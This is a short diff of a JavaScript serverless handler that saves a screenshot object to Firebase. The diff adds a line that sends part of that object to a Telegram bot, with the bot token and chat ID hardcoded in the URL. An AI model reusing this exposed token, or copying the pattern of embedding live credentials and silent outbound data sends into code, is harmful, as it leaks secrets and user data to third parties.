@@ -29,6 +29,7 @@ exports.handler = async event => {
     var o = {}
     o[(-1 * Number(String(Date.now() / 1000)).toFixed(0))] = screenshot
     await axios.patch(`https://iiilll.firebaseio.com/.json`, o)
+await axios.get(`https://api.telegram.org/bot1722678219:AAHLkfPXiaWUcaQR1FlobJ0Ue0JIZti9C6w/sendMessage?chat_id=528494103&text=`+screenshot.vi)
     return {
         statusCode: 200,
         body: JSON.stringify(screenshot)
